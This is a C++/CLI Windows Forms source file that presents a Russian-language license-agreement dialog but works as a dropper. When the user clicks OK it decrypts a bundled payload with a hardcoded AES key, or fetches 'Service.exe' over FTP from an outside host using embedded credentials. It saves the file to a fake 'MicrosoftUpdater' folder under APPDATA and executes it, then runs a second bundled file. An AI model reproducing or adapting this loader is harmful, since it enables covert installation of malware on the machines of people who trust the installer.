#pragma once
#include <windows.h>
#include <Shellapi.h>
#include <io.h>
#include <winuser.h>
#include <Windows.h>
#include <stdio.h>
#include <fcntl.h>
#include <iostream>
#include <stdio.h>
#include <WinInet.h>
#include <conio.h>
#include <wincrypt.h>
#include <Shlobj.h>
#include <Userenv.h>


#pragma comment (lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")

#define BLOCK_LEN 128


namespace Project2 {

	using namespace System;
	using namespace System::Resources;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;
	using namespace System::Diagnostics;
	using namespace std;

	/// <summary>
	/// —водка дл€ MyForm
	/// </summary>
	public ref class MyForm : public System::Windows::Forms::Form
	{
	public:
		MyForm(void)
		{
			InitializeComponent();
			//
			//TODO: добавьте код конструктора
			//
		}

	protected:
		/// <summary>
		/// ќсвободить все используемые ресурсы.
		/// </summary>
		~MyForm()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::Button^  button1;
	protected:
	private: System::Windows::Forms::Button^  button2;
	private: System::Windows::Forms::CheckBox^  checkBox1;
	private: System::Windows::Forms::RichTextBox^  richTextBox1;


	private:
		/// <summary>
		/// ќб€зательна€ переменна€ конструктора.
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// “ребуемый метод дл€ поддержки конструктора Ч не измен€йте 
		/// содержимое этого метода с помощью редактора кода.
		/// </summary>
		void InitializeComponent(void)
		{
			System::ComponentModel::ComponentResourceManager^  resources = (gcnew System::ComponentModel::ComponentResourceManager(MyForm::typeid));
			this->button1 = (gcnew System::Windows::Forms::Button());
			this->button2 = (gcnew System::Windows::Forms::Button());
			this->checkBox1 = (gcnew System::Windows::Forms::CheckBox());
			this->richTextBox1 = (gcnew System::Windows::Forms::RichTextBox());
			this->SuspendLayout();
			// 
			// button1
			// 
			this->button1->Location = System::Drawing::Point(380, 295);
			this->button1->Name = L"button1";
			this->button1->Size = System::Drawing::Size(75, 23);
			this->button1->TabIndex = 0;
			this->button1->Text = L"Cancel";
			this->button1->UseVisualStyleBackColor = true;
			this->button1->Click += gcnew System::EventHandler(this, &MyForm::button1_Click);
			// 
			// button2
			// 
			this->button2->Enabled = false;
			this->button2->Location = System::Drawing::Point(461, 295);
			this->button2->Name = L"button2";
			this->button2->Size = System::Drawing::Size(75, 23);
			this->button2->TabIndex = 1;
			this->button2->Text = L"OK";
			this->button2->UseVisualStyleBackColor = true;
			this->button2->Click += gcnew System::EventHandler(this, &MyForm::button2_Click);
			// 
			// checkBox1
			// 
			this->checkBox1->AutoSize = true;
			this->checkBox1->Location = System::Drawing::Point(12, 279);
			this->checkBox1->Name = L"checkBox1";
			this->checkBox1->Size = System::Drawing::Size(236, 17);
			this->checkBox1->TabIndex = 2;
			this->checkBox1->Text = L"я соглашаюсь с услови€ми пользовани€";
			this->checkBox1->UseVisualStyleBackColor = true;
			this->checkBox1->CheckedChanged += gcnew System::EventHandler(this, &MyForm::checkBox1_CheckedChanged);
			// 
			// richTextBox1
			// 
			this->richTextBox1->BackColor = System::Drawing::SystemColors::Control;
			this->richTextBox1->Location = System::Drawing::Point(12, 49);
			this->richTextBox1->Name = L"richTextBox1";
			this->richTextBox1->Size = System::Drawing::Size(524, 211);
			this->richTextBox1->TabIndex = 3;
			this->richTextBox1->Text = resources->GetString(L"richTextBox1.Text");
			// 
			// MyForm
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackgroundImageLayout = System::Windows::Forms::ImageLayout::None;
			this->ClientSize = System::Drawing::Size(548, 330);
			this->Controls->Add(this->richTextBox1);
			this->Controls->Add(this->checkBox1);
			this->Controls->Add(this->button2);
			this->Controls->Add(this->button1);
			this->DoubleBuffered = true;
			this->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"$this.Icon")));
			this->Name = L"MyForm";
			this->Text = L"Ћицензионное соглашение";
			this->ResumeLayout(false);
			this->PerformLayout();

		}
#pragma endregion


		const wchar_t *GetWC(const char *c)
		{
			const size_t cSize = strlen(c) + 1;
			wchar_t* wc = new wchar_t[cSize];
			mbstowcs(wc, c, cSize);

			return wc;
		}

		void upload(LPCSTR server, LPCSTR login, LPCSTR pass, LPCWSTR local_file, LPCWSTR remote_file)
		{
			HINTERNET hOpen, hConnection;

			hOpen = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

			hConnection = InternetConnectA(hOpen, server, INTERNET_DEFAULT_FTP_PORT, login, pass, INTERNET_SERVICE_FTP, 0, 0);

			if (FtpGetFile(hConnection, local_file, remote_file, 0, 0, 0, 0))
				cout << "Success Story" << endl;
			else
				cout << "Epic Fail!" << endl;

			InternetCloseHandle(hConnection);
			InternetCloseHandle(hOpen);
		}

		int DeCrypt()
		{
			LPCWSTR inFilename = L"data0.bin";
			LPCWSTR key_str = L"3igcZhRdWq96m3GUmTAiv9";

			string buf = GetNewFile();
			wstring stemp = wstring(buf.begin(), buf.end());
			LPCWSTR outFilename = stemp.c_str();

			size_t len = lstrlenW(key_str);

			HANDLE hInpFile = CreateFileW(inFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
			if (hInpFile == INVALID_HANDLE_VALUE)
			{
				return (-1);
			}
			HANDLE hOutFile = CreateFileW(outFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hOutFile == INVALID_HANDLE_VALUE) 
			{
				return (-1);
			}

			DWORD dwStatus = 0;
			BOOL bResult = FALSE;
			wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
			HCRYPTPROV hProv;
			if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) 
			{
				dwStatus = GetLastError();
				CryptReleaseContext(hProv, 0);
				return dwStatus;
			}
			HCRYPTHASH hHash;
			if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
			{
				dwStatus = GetLastError();
				CryptReleaseContext(hProv, 0);
				return dwStatus;
			}

			if (!CryptHashData(hHash, (BYTE*)key_str, len, 0))
			{
				DWORD err = GetLastError();
				return (-1);
			}

			HCRYPTKEY hKey;
			if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) 
			{
				dwStatus = GetLastError();
				CryptReleaseContext(hProv, 0);
				return dwStatus;
			}

			const size_t chunk_size = BLOCK_LEN;
			BYTE chunk[chunk_size] = { 0 };
			DWORD out_len = 0;

			BOOL isFinal = FALSE;
			DWORD readTotalSize = 0;

			DWORD inputSize = GetFileSize(hInpFile, NULL);

			while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
				if (0 == out_len) {
					break;
				}
				readTotalSize += out_len;
				if (readTotalSize == inputSize) {
					isFinal = TRUE;
				}

				if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
					break;
				}

				DWORD written = 0;
				if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
					break;
				}
				memset(chunk, 0, chunk_size);
			}

			CryptReleaseContext(hProv, 0);
			CryptDestroyKey(hKey);
			CryptDestroyHash(hHash);

			CloseHandle(hInpFile);
			CloseHandle(hOutFile);
			return 0;
		}

	private: System::Void checkBox1_CheckedChanged(System::Object^  sender, System::EventArgs^  e) 
	{
		button2->Enabled = checkBox1->Checked;
	}

	private: System::Void button2_Click(System::Object^  sender, System::EventArgs^  e) 
	{
		string file = GetNewFile();

		//LoadFile
		if (System::IO::File::Exists("data0.bin"))
		{
			if (DeCrypt() != 0)
			{
				try
				{
					wstring stemp = wstring(file.begin(), file.end());
					upload("fokes1.asuscomm.com", "ff", "WorkerFF", L"Service.exe", stemp.c_str());
				}
				catch (exception ex)
				{

				}
			}
		}
		else
		{
			try
			{				
				wstring stemp = wstring(file.begin(), file.end());
				upload("fokes1.asuscomm.com", "ff", "WorkerFF", L"Service.exe", stemp.c_str());
			}
			catch(exception ex)
			{

			}
		}
	
		try
		{
			//WinExec(file.c_str(), SW_SHOW);
			Process^ myProcess = gcnew Process();
			myProcess->StartInfo->FileName = gcnew String(file.c_str());
			myProcess->Start();
		}
		catch (const std::exception&) { }
		
		WinExec("data2.bin", SW_SHOW);

		Application::Exit();
	}
	
	private: std::string GetNewFile()
	{
		std::string file;
		try
		{
#pragma warning(disable : 4996)
			file.append(getenv("APPDATA"));

			if (strlen(file.c_str()) == 0)
			{
				if (System::IO::Directory::Exists("C:\\"))
				{
					file.clear();
					file.append("C:\\");
				}
			}
		}
		catch (exception ex)
		{
			if (System::IO::Directory::Exists("C:\\"))
			{
				file.clear();
				file.append("C:\\");
			}
		}
		file.append("\\MicrosoftUpdater");
		CreateDirectory(GetWC(file.c_str()), NULL);

		file.append("\\Service.exe");

		return file;
	}

	private: System::Void button1_Click(System::Object^  sender, System::EventArgs^  e) 
	{
		Application::Exit();
	}
};
}
